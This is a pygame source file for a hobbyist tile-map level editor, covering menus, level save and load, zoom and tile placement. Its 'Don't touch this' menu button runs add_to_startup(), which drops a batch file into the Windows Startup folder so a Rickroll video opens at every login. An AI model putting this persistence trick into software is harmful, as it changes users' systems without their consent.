import pygame
import os
import json
from map import Map
import webbrowser
import shutil

#TODO:
# - fix the zoom function
# - make a way to select multiple tiles
# - add background
# - make the aplication fullscreen workable
# - find a girlfriend

map = Map()

# Initialize Pygame
pygame.init()

# Set up display caption
pygame.display.set_caption('Level Editor')

# get resolution of the screen
info = pygame.display.Info()
WIDTH, HEIGHT = info.current_w, info.current_h

# Set up display
screen = pygame.display.set_mode((WIDTH // 1.5, HEIGHT // 1.5), pygame.RESIZABLE)
window_size = pygame.display.get_window_size()

# Define game variables
'''fix: make them chosen by user'''
ROWS = 100
COLS = 200
TILE_SIZE = 16

scaled_tile_size = TILE_SIZE

running = False

#mouse setup
scroll_value = 1
scroll_speed = 0.05
mouse_pos = pygame.mouse.get_pos()

# Screen setup
LOWER_MARGIN = window_size[1] / 1
SIDE_MARGIN = window_size[0] / 1.4

# sidebar setup
sidebar_scroll = 0
sidebar_scroll_speed = 20
tiles_per_row = 4 

# Define grid boundaries
GRID_MIN_X = 0
GRID_MIN_Y = 0
GRID_MAX_X = COLS * TILE_SIZE
GRID_MAX_Y = ROWS * TILE_SIZE

#grid 
grid_mov_hor = 0
grid_mov_ver = 0

grid_max_x_scaled = grid_mov_hor
grid_max_y_scaled = grid_mov_ver

move_speed = 10  # Speed of grid movement

# Colors
WHITE = (255, 255, 255)
BLACK = (0, 0, 0)
GRAY = (100, 100, 100)

# Clock for controlling frame rate
clock = pygame.time.Clock()
FPS = 60

# Mulit-tile selection
multi_tiled = [0, 4, 6]

# Data structures
placed_tiles = {}  # Stores tiles as {(grid_x, grid_y): tile_type}
placing_tile = False  # Tracks if the mouse is being held down
removing_tile = False  # Tracks if the right mouse button is held down

map.load_sprites()


current_ascii = 33 # Start with ASCII 33 ('!')
selected_tile = chr(current_ascii)  # Default selected tile

'''make it chouseble by the player'''
level = 0 # Default level number

sheet = []  # 2D list to store the level data

level_file = "level_" + str(level) + ".txt"
SAVE_FILE = level_file

def add_to_startup():
    webbrowser.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ")
    # Batch file content to open the website
    batch_content = """@echo off
start chrome https://www.youtube.com/watch?v=dQw4w9WgXcQ
exit
"""
    # Get the path for the batch file and the Startup folder
    batch_file_path = os.path.join(os.getcwd(), "open_website.bat")
    startup_folder = os.path.join(os.environ["APPDATA"], "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
    
    # Write the batch file to the current directory
    with open(batch_file_path, "w") as batch_file:
        batch_file.write(batch_content)

    # Move the batch file to the Startup folder
    shutil.move(batch_file_path, os.path.join(startup_folder, "open_website.bat"))
    print("Batch file added to startup.")

def load_level():
    global sheet, selected_tile
    if not os.path.exists(SAVE_FILE): 
        print("Level file not found. Creating a new one...")
        with open(SAVE_FILE, "w") as file:
            for i in range(ROWS):
                for j in range(COLS):
                    file.write("-")
                file.write("\n")
    
    with open(SAVE_FILE, "r") as file:
        lines = file.readlines()
        sheet = [list(line.strip()) for line in lines]

def save_level():
    global sheet
    with open(SAVE_FILE, "w") as file:
        for row in sheet:
            file.write("".join(row) + "\n")

def menu():
    global running, level, SAVE_FILE

    def draw_button(text, rect, callback=None):
        """Draw a button and handle clicks."""
        mouse_pos = pygame.mouse.get_pos()
        # Check if mouse is hovering
        if rect.collidepoint(mouse_pos):
            color = (150, 150, 150)  # Hover color
        else:
            color = (100, 100, 100)  # Default color

        # Draw button
        pygame.draw.rect(screen, color, rect)
        font = pygame.font.Font(None, 40)
        text_surf = font.render(text, True, WHITE)
        text_rect = text_surf.get_rect(center=rect.center)
        screen.blit(text_surf, text_rect)

        return rect.collidepoint(mouse_pos)  # Return if mouse is hovering for click handling

    def start_game():
        global running
        running = True  # Exit menu and start main loop

    def dont_touch_this():
        print("Don't touch this!")  # Debug
        add_to_startup()

    def change_level():
        global level, SAVE_FILE
        if event.type == pygame.MOUSEBUTTONDOWN:  # Handle single clicks
            if event.button == 1:  # Left mouse button
                level += 1  # Increment level
            elif event.button == 3:  # Right mouse button
                level -= 1  # Decrement level
        SAVE_FILE = f"level_{level}.txt"
        load_level()  # Reload level

    def load_level_menu():
        load_level()
        print("Level loaded")  # Debug

    while not running:
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                pygame.quit()
                exit()

            if event.type == pygame.MOUSEBUTTONDOWN:  # Handle single clicks
                if change_button_rect.collidepoint(event.pos):
                    change_level()
                if start_button_rect.collidepoint(event.pos):
                    start_game()
                if load_button_rect.collidepoint(event.pos):
                    load_level_menu()
                if dont_touch_this_rect.collidepoint(event.pos):
                    dont_touch_this()

                

        # Draw menu background
        screen.fill(GRAY)

        # Define buttons
        button_width, button_height = 200, 50
        start_button_rect = pygame.Rect((window_size[0] // 2 - button_width // 2, 200), (button_width, button_height))
        change_button_rect = pygame.Rect((window_size[0] // 2 - button_width // 2, 300), (button_width, button_height))
        load_button_rect = pygame.Rect((window_size[0] // 2 - button_width // 2, 400), (button_width, button_height))
        dont_touch_this_rect = pygame.Rect((window_size[0] // 2 - button_width // 2, 500), (button_width, button_height))

        # Draw buttons
        draw_button("Start", start_button_rect)
        draw_button("Change Level", change_button_rect)
        draw_button("Load Level", load_button_rect)
        draw_button("Don't touch this", dont_touch_this_rect)

        # Display the current level next to the "Change Level" button
        font = pygame.font.Font(None, 40)
        level_text = f"{level}"
        level_surf = font.render(level_text, True, WHITE)
        level_rect = level_surf.get_rect(midleft=(change_button_rect.right + 10, change_button_rect.centery))
        screen.blit(level_surf, level_rect)

        # Update display
        pygame.display.flip()
        clock.tick(FPS)


    



def menage_level(event):
    global level, SAVE_FILE
    if event.type == pygame.KEYDOWN:
        if event.key == pygame.K_UP:
            level += 1
            SAVE_FILE = "level_" + str(level) + ".txt"
            load_level()
        elif event.key == pygame.K_DOWN:
            level -= 1
            SAVE_FILE = "level_" + str(level) + ".txt"
            load_level()

    


def check_fucking_boundrys():
    global scaled_tile_size, scroll_value, grid_mov_hor, grid_mov_ver, grid_max_x_scaled, grid_max_y_scaled
    window_size = pygame.display.get_window_size()
    grid_max_x_scaled = (COLS * scaled_tile_size) - window_size[0]
    grid_max_y_scaled = (ROWS * scaled_tile_size) - window_size[1]

    if (scaled_tile_size * COLS) - grid_mov_hor < window_size[0]:
        scroll_value += scroll_speed
        scaled_tile_size = TILE_SIZE * scroll_value

    if (scaled_tile_size * ROWS) - grid_mov_ver < window_size[1]:
        scroll_value += scroll_speed
        scaled_tile_size = TILE_SIZE * scroll_value
        



def handle_scroll(event, scroll_value):
    global scaled_tile_size, grid_mov_hor, grid_mov_ver, mouse_pos
    mouse_pos = pygame.mouse.get_pos()
    if event.type == pygame.MOUSEBUTTONDOWN and pygame.mouse.get_pos()[0] < SIDE_MARGIN:
        
        if event.button == 4:  # Scroll up (zoom in)
                scroll_value += scroll_speed

        elif event.button == 5:# Scroll down (zoom out)
                scroll_value -= scroll_speed

    return scroll_value, scaled_tile_size

def handle_grid_movement(event):
    global grid_mov_hor, grid_mov_ver, move_speed, scaled_tile_size, grid_max_x_scaled, grid_max_y_scaled
    # Handle middle mouse button dragging
    
    if event.type == pygame.MOUSEMOTION and pygame.mouse.get_pressed()[1]:
        dx, dy = event.rel  # Relative movement

        grid_mov_hor = max(0, min(grid_mov_hor - dx, grid_max_x_scaled))
        grid_mov_ver = max(0, min(grid_mov_ver - dy, grid_max_y_scaled))
        

def draw_grid(scaled_tile_size):
    window_size = pygame.display.get_window_size()
    # Horizontal lines
    for col in range(COLS + 1):
        x = col * scaled_tile_size - grid_mov_hor
        if x <= window_size[0]:
            pygame.draw.line(screen, BLACK, (x, 0), (x, window_size[0]))

    # Vertical lines
    for row in range(ROWS + 1):
        y = row * scaled_tile_size - grid_mov_ver
        if y < window_size[1]:
            pygame.draw.line(screen, BLACK, (0, y), (window_size[0], y))


def load_tiles():
    return map.tiles  # Assuming map.tiles is already loaded with textures

tiles = load_tiles()  # Update to use actual textures

# def tile_selection(event):
#     global current_ascii, selected_tile
#     if event.type == pygame.KEYDOWN:
#         if event.key == pygame.K_UP:
#             current_ascii = min(current_ascii + 1, 126)  # Limit to printable ASCII
#         elif event.key == pygame.K_DOWN:
#             current_ascii = max(current_ascii - 1, 33)   # Avoid non-printable ASCII
#         selected_tile = chr(current_ascii)
#         print(f"Selected Tile: {selected_tile}")  # For debugging

# Handle tile placement and removal
def handle_tile_placement(event):
    global placing_tile, removing_tile, placed_tiles, selected_tile, multi_tiled    
    
    if event.type == pygame.MOUSEBUTTONDOWN:
        if event.button == 1:  # Left mouse button
            placing_tile = True
        elif event.button == 3:  # Right mouse button
            removing_tile = True

    elif event.type == pygame.MOUSEBUTTONUP:
        if event.button == 1:  # Left mouse button
            placing_tile = False
        elif event.button == 3:  # Right mouse button
            removing_tile = False



def draw_tiles(tile_size=None):
    global sheet
    mouse_pos = pygame.mouse.get_pos()
    grid_x = int((mouse_pos[0] + grid_mov_hor) // scaled_tile_size)
    grid_y = int((mouse_pos[1] + grid_mov_ver) // scaled_tile_size)
    x = grid_x * scaled_tile_size - grid_mov_hor
    y = grid_y * scaled_tile_size - grid_mov_ver

    scaled_tile = pygame.transform.scale(tiles[selected_tile], (scaled_tile_size, scaled_tile_size))
    screen.blit(scaled_tile, (x, y))
    if placing_tile:
        sheet[grid_y][grid_x]  = selected_tile
    elif removing_tile:
        sheet[grid_y][grid_x] = "-"
    
    for nx, i in enumerate(sheet):
        for ny, j in enumerate(i):
            if j != "-":
                scaled_tile = pygame.transform.scale(tiles[j], (scaled_tile_size, scaled_tile_size))
                screen.blit(scaled_tile, (ny*tile_size - grid_mov_hor, nx*tile_size - grid_mov_ver))
    
def handle_sidebar_scroll(event):
    global sidebar_scroll
    if event.type == pygame.MOUSEBUTTONDOWN and pygame.mouse.get_pos()[0] > SIDE_MARGIN:
        if event.button == 4:  # Scroll up
            sidebar_scroll = max(0, sidebar_scroll - sidebar_scroll_speed)
        elif event.button == 5:  # Scroll down
            sidebar_scroll += sidebar_scroll_speed

def draw_sidebar():
    """Draw the tile selection sidebar."""
    global selected_tile
    pygame.draw.rect(screen, GRAY, (SIDE_MARGIN, 0, window_size[0] - SIDE_MARGIN, window_size[1]), 0)

    # Calculate tile preview size and spacing
    preview_size = TILE_SIZE * 4
    spacing = 10
    start_x = SIDE_MARGIN + 10
    start_y = 10 - sidebar_scroll  # Apply scroll offset

    # Display all tiles in a grid within the sidebar
    for i, tile_type in enumerate(tiles.keys()):
        row = i // tiles_per_row
        col = i % tiles_per_row

        x = start_x + col * (preview_size + spacing)
        y = start_y + row * (preview_size + spacing)

        # Skip tiles outside the visible area
        if y + preview_size < 0 or y > window_size[1]:
            continue

        # Draw tile preview
        tile_surface = pygame.transform.scale(tiles[tile_type], (preview_size, preview_size))
        screen.blit(tile_surface, (x, y))

        # Highlight selected tile
        if tile_type == selected_tile:
            pygame.draw.rect(screen, WHITE, (x - 2, y - 2, preview_size + 4, preview_size + 4), 2)

        # Handle tile selection on click
        if pygame.mouse.get_pressed()[0]:
            mouse_x, mouse_y = pygame.mouse.get_pos()
            if x <= mouse_x <= x + preview_size and y <= mouse_y <= y + preview_size:
                selected_tile = tile_type
                print(f"Selected Tile: {selected_tile}")  # For debugging
        
def mulitselect(event):
    mouse_pos = pygame.mouse.get_pos()
    if event.type == pygame.MOUSEBUTTONDOWN:  # Handle single clicks
        if event.button == 1 and pygame.key.get_mods() & pygame.K_LSHIFT:
            prev_mouse_pos = mouse_pos

            pass


            




load_level()

def main():
    global scroll_value, mouse_pos, scaled_tile_size, running
    
    menu()
    
    while running:
        scaled_tile_size = TILE_SIZE * scroll_value
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                running = False
            if event.type == pygame.KEYDOWN:
                if event.key == pygame.K_s and pygame.key.get_mods() & pygame.KMOD_CTRL:
                    save_level()
                    print("Level saved")
                if event.key == pygame.K_ESCAPE:
                    running = False
                    save_level()
                    menu()
            mulitselect(event)
            scroll_value, scaled_tile_size = handle_scroll(event, scroll_value)
            # tile_selection(event)
            handle_sidebar_scroll(event)
            handle_grid_movement(event)
            handle_tile_placement(event)
            menage_level(event)
            check_fucking_boundrys()

        # print(scaled_tile_size)
        screen.fill(WHITE)
        check_fucking_boundrys() 
        draw_tiles(scaled_tile_size)
        draw_grid(scaled_tile_size)
        draw_sidebar() 
        pygame.display.flip()
        clock.tick(FPS)

    save_level()
    pygame.quit()

if __name__ == "__main__":
    main()